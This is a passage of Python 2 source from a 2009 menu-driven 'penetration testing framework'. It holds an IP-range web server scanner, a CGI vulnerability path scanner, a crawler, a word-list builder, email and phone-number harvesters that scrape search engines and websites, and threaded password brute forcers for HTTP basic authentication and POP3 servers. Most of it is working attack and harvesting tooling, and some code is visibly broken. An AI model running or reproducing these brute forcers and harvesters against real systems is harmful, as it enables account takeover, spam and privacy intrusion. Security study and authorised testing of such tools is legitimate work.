			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

def websevye():

	import socket, httplib, threading, time, sys

	def scan(ip, msg):
		ports = [80,8000,8080]
		for port in ports:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((ip, port))
				s.close()
				print "[+] Open:",ip+":"+str(port)
				servtest(ip, port)
			except:
				pass
	
	
	def getips(ip_range):
		
		lst = []
		iplist = []
		ip_range = ip_range.rsplit(".",2)
		if len(ip_range[1].split("-",1)) ==2:
			for i in range(int(ip_range[1].split("-",1)[0]),int(ip_range[1].split("-",1)[1])+1,1):
				lst.append(ip_range[0]+"."+str(i)+".")
			for ip in lst:
				for i in range(int(ip_range[2].split("-",1)[0]),int(ip_range[2].split("-",1)[1])+1,1):
					iplist.append(ip+str(i))
			return iplist
		if len(ip_range[1].split("-",1)) ==1:
			for i in range(int(ip_range[2].split("-",1)[0]),int(ip_range[2].split("-",1)[1])+1,1):
				iplist.append(ip_range[0]+"."+str(ip_range[1].split("-",1)[0])+"."+str(i))
			return iplist
	
		
	def servtest(ip, port):
		
		try:
			h = httplib.HTTP(ip+":"+str(port))
			h.putrequest("HEAD", "/")
			h.putheader("Host", ip)
			h.endheaders()
			status, reason, headers = h.getreply()
			server = headers.get("Server")
			if server:
				print "[+] Running:",server,"\n"
		except: pass
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  WEB SERVER SERVICE ENUMERATION            #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			ashu=raw_input("\n\tEnter The Ip Range Here : ")
			try:
				iplist = getips(ashu)
			except(ValueError):
				print "[-] Incorrect IP-Range\n"
				sys.exit(1)
			print "\n[+] Scanning:",len(iplist),"ips\n"
			socket.setdefaulttimeout(3)
			for ip in iplist:
				time.sleep(1)
				threading.Thread( target=scan, args=(ip, 0) ).start()
			sending_back_to_Vilage=raw_input("\n")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
	

def getipad():

	import re, sys
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  IP EXTRACTOR    #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			file = raw_input("\n\tEnter The File Name Here : ")

			text_file = open(file, "r").readlines()
	
			for line in text_file:
				ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", line)
				if ipaddr: print ipaddr[0]
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def dumpeml():

	#!/usr/bin/python
	import sys, re, sets
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  EMAIL EXTRACTOR    #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			ashu=raw_input("\n\tEnter The Data Base Name Here : ")
			salu=raw_input("\n\tEnter The File Name Where You Wanted To Save : ")
			try:
				database = open(ashu, "r").read()
			except(IOError): 
				print "\nError: Check your db path\n"
				sys.exit(1)
  
			emails =  list(sets.Set(re.findall('[\.\w]+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}', database)))
			if len(emails) >= 1:
				ofile = open(salu, "a")
				print "\nFound:",len(emails)
				print "Writing to file:",salu,"\n\n"
				for e in emails:
					print e
					ofile.writelines(e+"\n")
				ofile.close()
			else:
				print "\n[-] No email addresses found\n"
			print "\n[+] Done\n"	
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

def cgiscan():

	import sys, httplib, time, socket
	global anony
	def main(path):
	
		if path[0] == "/":
			path = path[1:]
		
		if proxy != 0:
			h = httplib.HTTP(proxy)
			h.putrequest("GET", "http://"+host+path)
		else:
			h = httplib.HTTP(host[:-1])
			h.putrequest("HEAD", "/"+path)
		h.putheader("Host", host)
		h.endheaders()
		okresp, reason, headers = h.getreply()
		return okresp, reason, headers.get("Server")
		
	def timer():
		now = time.localtime(time.time())
		return time.asctime(now)
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  CGI SCANNAR                               #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			socket.setdefaulttimeout(15)
			ashu=raw_input("Enter The Website Name Here : ")
			salu=raw_input("Enter The Port Website Port No Here : ")
			kulu=raw_input("Enter The File Name Where You Want To Save The Risult : ")	
			host = ashu
			port = salu
			ashikalim= 'cgilist'

			try:
				lines = open(ashikalim, "r").readlines() #vulerable list, change path/name if necessary
			except(IOError): 
			 	print "[-] Error: Check your paths_file location.\n" 
				sys.exit(1)
			file = kulu
			proxy = anony
			verbose = 1
			host = host.replace("http://","")
			if host.count("/") >= 1:
				host = host.rsplit("/",1)[0]
			if host[-1:] != "/":
				host =  host+"/"	
		
			try:
				okresp = main(" ")[:1]
			except(socket.timeout):
				print "\n[-] Timed Out"
				print "[-] Try new proxy or different host\n"
				sys.exit(1)
			except(socket.gaierror), error:
				print "\nError:",error
				print "\n[-] Check your host\n"
				sys.exit(1)
			
			badresp,reason,server = main("/ashikali.html")
			
			if okresp[0] == badresp:
				print "\n[-] Responses matched, try another host."
				print "[-] Responses:",okresp[0], badresp,"\n"
				sys.exit(1)
			else:
				print "\n[+] Target host:",host
				print "[+] Target port:",port
				print "[+] Target server:",server
				print "[+] Paths Loaded:",len(lines)
				try:
					if file:
						output_file = open(file, "a")
						print "[+] Output File:",file
				except(NameError):
					output_file = None
					pass
				pass
				print "[+] Target OK response:",okresp[0]
				print "[+] Target BAD response:",badresp, reason
				print "[+] Scan Started at",timer()
				print "-"*55
				time.sleep(3)
			
			found_vuln = []
			for line in lines:
				if verbose == 1:
					print "\n[-] Left:",len(lines)
				try: 
					time.sleep(1)
					response, reason = main(line.strip("\n"))[:2]
					if verbose == 1:
						print "\n[+] Trying:",line,"   Got:",response, reason
					if response == okresp[0]:
						found_vuln.append(host+line)
						print "\n\t[+]",response,reason,":",host+line
					if response == int(401):
						print "\n\t[-]",response,reason,":",host+line,"\tNeeds Authorization"
				except(AttributeError, TypeError): 
					pass
				lines.remove(line)
			
			if len(found_vuln) == 0:
				print "\n[-] Couldn't find anything.\n"
			else:
				print "-"*55
				print "\n[+] Found",len(found_vuln),"possible vulnerabilities, check manually."
				for x in found_vuln:
					if output_file != None:
						output_file.writelines("[+]"+x+"\n")
					print "\n[!] ",x
			print "\n[-] Scan completed at",timer(),"\n"
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
			
		
def wordext():
	
	#!/usr/bin/python
	#Word Extractor from a site.

	import sys, urllib2, re, sets

	#Min length of word
	MIN_LENGTH = 3
	#Max length of word
	MAX_LENGTH = 10

	def StripTags(text):
		finished = 0
		while not finished:
			finished  =1
			start =  text.find("<")
			if start >= 0:
				stop = text[start:].find(">")
				if stop >= 0:
					text = text[:start] + text[start+stop+1:]
					finished = 0
		return text
	

	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  WORD EXTRACTOR                            #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')

			ashu=raw_input("\n\tEnter The Target here : ")
			sal1=raw_input("\n\tEnter The File Name Here To Save : ")
			site = ashu
			if site[:7] != "http://":
				site = "http://"+site
		
			print "\n[+] Retrieving Source:",site
			source = StripTags(urllib2.urlopen(site).read())
			words = re.findall("\w+",source)
			words = list(sets.Set(words))
			l = len(words)
			print "[+] Found:",l,"words"
			print "[+] Trimming words to length"
			for word in words:
				if not MIN_LENGTH <= len(word) <= MAX_LENGTH:
					words.remove(word)
			print "\n[+] Removed:",l-len(words),"words"
			print "[+] Writing:",len(words),"words to",sal1
			file = open(sal1,"a")
			for word in words:
				file.writelines(word+"\n")
			file.close()
			print "\n[-] Complete\n"
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
				
				
def linkerm():

	from sgmllib import SGMLParser
	import sys, urllib, httplib, re, urllib2, sets, socket, sgmllib
	socket.setdefaulttimeout(5)

	class URLLister(SGMLParser):
		def reset(self):
			SGMLParser.reset(self)
			self.urls = []

		def start_a(self, attrs):
			href = [v for k, v in attrs if k=='href']
			if href:
				self.urls.extend(href)

	def parse_urls(links):
		urls = []
		for link in links: 
			num = link.count("=")
			if num > 0:
				for x in xrange(num):
					x = x+1
					if link[0] == "/" or link[0] == "?":
						url = site+link.rsplit("=",x)[0]+"="
					else:
						url = link.rsplit("=",x)[0]+"="
					if url.find(site.split(".",1)[1]) == -1:
						url = site+url
					if url.count("//") > 1:
						url = "http://"+url[7:].replace("//","/",1)
					urls.append(url)
		urls = list(sets.Set(urls))
		return urls

	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  WEBSITE CRAWLAR                           #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')

			site = raw_input("\n\n\tEnter The Target Where To Start : ") 
			site = site.replace("http://","").rsplit("/",1)[0]+"/"
			site = "http://"+site.lower()
			try:
				usock = urllib.urlopen(site)
				parser = URLLister()
				parser.feed(usock.read().lower())
				parser.close()
				usock.close()
			except(IOError, urllib2.URLError), msg: 
				print "[-] Error Connecting to",site
				print "[-]",msg
				sys.exit(1)
			urls = parse_urls(parser.urls)
			print "[+] Links Found:",len(urls)
			for url in urls: 
				try:
					print "\n\t",url
				except(KeyboardInterrupt):
					pass
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

	
def emailget():

	#!/usr/bin/python

	import urllib, sys, re, random, socket, time, urllib2, string, sets
	def timer():
		now = time.localtime(time.time())
		return time.asctime(now)

	def StripTags(text):
	    finished = 0
	    while not finished:
	        finished = 1
	        start = text.find("<")
	        if start >= 0:
	            stop = text[start:].find(">")
	            if stop >= 0:
	                text = text[:start] + text[start+stop+1:]
	                finished = 0
	    return text
 
	def getgoog(domain):
		counter = 0
		goog_emails = []
		try:
			while counter < 100:
				results = 'http://groups.google.com/groups?q='+str(domain)+'&hl=en&lr=&ie=UTF-8&start=' + repr(counter) + '&sa=N'
				request = urllib2.Request(results)
				request.add_header('User-Agent','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)')
				opener = urllib2.build_opener()  
				text = opener.open(request).read()
				emails = (re.findall('([\w\.\-]+@'+domain+')',StripTags(text)))
				for email in emails:
					goog_emails.append(email)
				counter += 10
			page_counter = 0
			while page_counter < 100 :
				results_web = 'http://www.google.com/search?q=%40'+str(domain)+'&hl=en&lr=&ie=UTF-8&start=' + repr(page_counter) + '&sa=N'
				request_web = urllib2.Request(results_web)
				request_web.add_header('User-Agent','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)')
				opener_web = urllib2.build_opener()  
				text = opener_web.open(request_web).read()
				emails_web = (re.findall('([\w\.\-]+@'+domain+')',StripTags(text)))
				for email_web in emails_web:
					goog_emails.append(email_web)
				page_counter += 10
		
			goog_emails = list(sets.Set(goog_emails))
			return goog_emails
		except(IndexError):
			pass
		
	def geturls(url):
		
		try:
			if verbose == 1:
				print "Collecting:",url
			site = urllib.urlopen(url).read()
			links = re.findall(('http://[\w\.\-]*'), site)
			for link in links:
				if link not in urls:
					urls.append(link)
		except(IOError,TypeError,AttributeError,socket.timeout, socket.gaierror, socket.error): pass
		return urls
		
	def getaddress(url):
		
		if verbose == 1:
			print "Checking:",url
		try:
			emails = []
			site = urllib.urlopen(url).read()
			try:
				if domain:
					emails = re.findall('[\w\.\-]+@'+domain, site)
					t1 = re.findall('[\w\.\-]+\[at\]'+domain, site)
					t2 = re.findall('[\w\.\-]+\[at\]'+re.sub("\.","\[dot\]",domain), site)
					if len(t1) >= 1:
						for addr in t1:
							emails.append(addr.replace("[at]","."))
				if len(t2) >= 1:
					for addr in t2:
						emails.append(addr.replace("[at]",".").replace("[dot]","."))
			except(NameError):
				emails = re.findall('[\.\w]+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}', site)
				t1 = re.findall('[\w\.\-]+\[at\][\w\.\-]+\.\w\w\w', site)
				t2 = re.findall('[\w\.\-]+\[at\][\w\.\-]+\[dot\]\w\w\w', site)
				if len(t1) >= 1:
					for addr in t1:
						emails.append(addr.replace("[at]","@"))
				if len(t2) >= 1:
					for addr in t2:
						emails.append(addr.replace("[at]",".").replace("[dot]","."))
				pass
			if len(emails) >=1:
				data = open(sa, "a")
				for email in emails:
					if email not in addresses:
						addresses.append(email)
						data.writelines(email+"\n")
						print "\nFound:",email,"\nTotal:",len(addresses),"\n"
				data.close()
				
		except(IOError,TypeError,AttributeError,socket.timeout,socket.gaierror,socket.error): 
			pass
		except(KeyboardInterrupt):
			pass	
		return addresses
			
	cho = '0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  EMAIL SPIDER                              #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')

			as = raw_input("\n\n\tEnter The Target Where To Start : ") 
			sa = raw_input("\n\n\tEnter The File Name : ") 
			la = raw_input("\n\n\tEnter The Number Of Email Which You Want To Get : ") 
			ma = raw_input("\n\n\tEnter The Search Engine Name : ") 

			url = as
			length = int(la)
			verbose = 1
	
			if url[:7] != "http://":
				url = "http://"+url

			addresses = []
			urls = []
			socket.setdefaulttimeout(3)
			print "[+] Starting:",url
			print "[+] File:",sa
			try:
				if domain:
					domain = re.sub("@","",domain)
					print "[+] Domain:",domain
			except(NameError):
				print "[+] Searching: all domains"
				pass
			print "[+] Collecting:",length
			try:
				if verbose ==1:
					print "[+] Verbose Mode On"
			except(NameError):
				verbose = 0
				print "[-] Verbose Mode Off"
			print "[+] Started:",timer(),"\n"

			try:
				if domain:
					print "[+] Getting addresses from google...\n"
					goog_emails = getgoog(domain)
					print "[+] Found:",len(goog_emails),"from google."
					if len(goog_emails) >= 1:
						file = open(sa, "a")
						for e in goog_emails:
							file.writelines(e+"\n")
							addresses.append(e)
					file.close()
			except(NameError):
				pass

			if int(len(addresses)) < length: 
				urls = geturls(url)

			while int(len(addresses)) < length:
	
				try:
					addresses = getaddress(random.choice(urls))
				except(IndexError):
					print "[-] Ran out of links, try another start site\n"
					sys.exit(1)
				if len(urls) < 1000:
					urls = geturls(random.choice(urls))
				else:
					for url in urls[1:300]:
						urls.remove(url)

			print "\n[+] Final Total:",len(addresses)
			print "[+] Data:",sa
			print "[+] Done",timer(),"\n"
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")



	
	
def httl():
			
	import threading, time, random, sys, poplib, urllib2
	from copy import copy
	cho= '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  HTTP BASIC AUTHENTICATION BRUTE FORCER    #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlphttp()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')


			ashik=raw_input("\nEnter Target Here : ")
			sohil=raw_input("\nEnter The User List Here File Here : ")
			shahid=raw_input("\nEnter The Word List Here : ")
			try:
			  	users = open(sohil, "r").readlines()
			except(IOError): 
			  	print "Error: Check your userlist path\n"
			  	sys.exit(1)
  
			try:
			  	words = open(shahid, "r").readlines()
			except(IOError): 
			  	print "Error: Check your wordlist path\n"
			  	sys.exit(1)

			wordlist = copy(words)

			def reloader():
				for word in wordlist:
					words.append(word)

			def getword():
				lock = threading.Lock()
				lock.acquire()
				if len(words) != 0:
					value = random.sample(words,  1)
					words.remove(value[0])		
				else:
					print "\nReloading Wordlist - Changing User\n"
					reloader()
					value = random.sample(words,  1)
					users.remove(users[0])
		
				lock.release()
				if len(users) ==1:
					return users[0], value[0][:-1]
				else:
					return users[0][:-1], value[0][:-1] 

			def getauth(url):
	
				req = urllib2.Request(url)
				try:
			    		handle = urllib2.urlopen(req)
				except IOError, e:                  
    					pass
				else:                               
			    		print "This page isn't protected by basic authentication.\n"
			    		sys.exit(1)
    
				if not hasattr(e, 'code') or e.code != 401:                 
			    		print "\nThis page isn't protected by basic authentication."
			    		print 'But we failed for another reason.\n'
			    		sys.exit(1)

				authline = e.headers.get('www-authenticate', '')    
          
				if not authline:
    					print '\nA 401 error without an basic authentication response header - very weird.\n'
    					sys.exit(1)
				else:
					return authline
			
			class Worker(threading.Thread):
	
				def run(self):
					username, password = getword()
					try:
						print "-"*12
						print "User:",username,"Password:",password
						req = urllib2.Request(ashik)
						passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
						passman.add_password(None, ashik, username, password)
						authhandler = urllib2.HTTPBasicAuthHandler(passman)
						opener = urllib2.build_opener(authhandler)
						fd = opener.open(req)
						print "\t\n\nUsername:",username,"Password:",password,"----- Login successful!!!\n\n"			
						print "Retrieved", fd.geturl()
						info = fd.info()
						for key, value in info.items():
			    				print "%s = %s" % (key, value)
						sys.exit(2)
					except (urllib2.HTTPError, httplib.BadStatusLine,socket.error), msg: 
						print "An error occurred:", msg
						pass

			print "[+] Server:",ashik
			print "[+] Users Loaded:",len(users)
			print "[+] Words Loaded:",len(words)
			print "[+]",getauth(ashik),"\n"

			for i in range(len(words)*len(users)):
				work = Worker()
				work.setDaemon(1)
				work.start()
				time.sleep(1)

			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")



def po3():
	
	import threading, time, random, sys, poplib
	from copy import copy
	cho= '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali            #"
		print "\t\t#    POP3 BRUTE FORCER                          #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#    www.Ashikali.com                          #" 
		print "\t\t#    GNU General Public License                #"
		print "\t\t################################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':		
			hlppop()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')


			ashik=raw_input("\nEnter Target Here : ")
			sohil=raw_input("\nEnter The User List Here File Here : ")
			shahid=raw_input("\nEnter The Word List Here : ")

			try:
  				users = open(sohil, "r").readlines()
			except(IOError): 
			  	print "Error: Check your userlist path\n"
			  	sys.exit(1)
  
			try:
			  	words = open(shahid, "r").readlines()
			except(IOError): 
			  	print "Error: Check your wordlist path\n"
			  	sys.exit(1)
	
			try:
				pop = poplib.POP3(ashik)
				welcome = pop.getwelcome()
				pop.quit()
			except (poplib.error_proto): 
				welcome = "No Response"
				pass

			print "[+] Server:",ashik
			print "[+] Users Loaded:",len(users)
			print "[+] Words Loaded:",len(words)
			print "[+] Server response:",welcome,"\n"

			wordlist = copy(words)

			def reloader():
				for word in wordlist:
					words.append(word)

			def getword():
				lock = threading.Lock()
				lock.acquire()
				if len(words) != 0:
					value = random.sample(words,  1)
					words.remove(value[0])
		
				else:
					print "Reloading Wordlist - Changing User\n"
					reloader()
					value = random.sample(words,  1)
					users.remove(users[0])
		
				lock.release()
				return value[0][:-1], users[0][:-1]
		
			class Worker(threading.Thread):
	
				def run(self):
					value, user = getword()
					try:
						print "-"*12
						print "User:",user,"Password:",value
						pop = poplib.POP3(ashik)
						pop.user(user)
						pop.pass_(value)
						print "\t\nLogin successful:",value, user
						print pop.stat()
						pop.quit()
						work.join()
						sys.exit(2)
					except (poplib.error_proto), msg: 
						#print "An error occurred:", msg
						pass
 
			for i in range(len(words)*len(users)):
				work = Worker()
				work.start()
				time.sleep(1)

			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

			

def serp():
	import sys, re, string, urllib2, sets
	from copy import copy
	cho= '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    PHONE NUMBER SERCHER                       #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlpphone()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')


			def StripTags(text):
				finished = 0
			    	while not finished:
        				finished = 1
        				start = text.find("<")
        				if start >= 0:
            					stop = text[start:].find(">")
            					if stop >= 0:
                					text = text[:start] + text[start+stop+1:]
                					finished = 0
				return text
		  
			def getgoog(lang):
	
				page_counter=0
				try:
    					while page_counter < 50:
        					results_web = 'http://www.google.com/search?q='+str(query)+'&hl='+str(lang)+'&lr=&ie=UTF-8&start='+repr(page_counter)+'&sa=N'
        					request_web = urllib2.Request(results_web)
        					request_web.add_header('User-Agent','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)')
        					opener_web = urllib2.build_opener()                           
        					text = opener_web.open(request_web).read()
        					names = re.findall(('\d\d\d\-\d\d\d\-\d\d\d\d'),StripTags(text))
        					for name in names:
							if name not in d:
								d.append(name)
        					page_counter +=10
        
				except IOError:
    					print "[-] Can't connect to Google Web!"+""
					pass
		
			def getmsn():
	
				page_counter=0
				try:
    					while page_counter < int(sakman):
        					results_web = 'http://search.msn.com/results.aspx?q='+str(query)+'&first='+repr(page_counter)
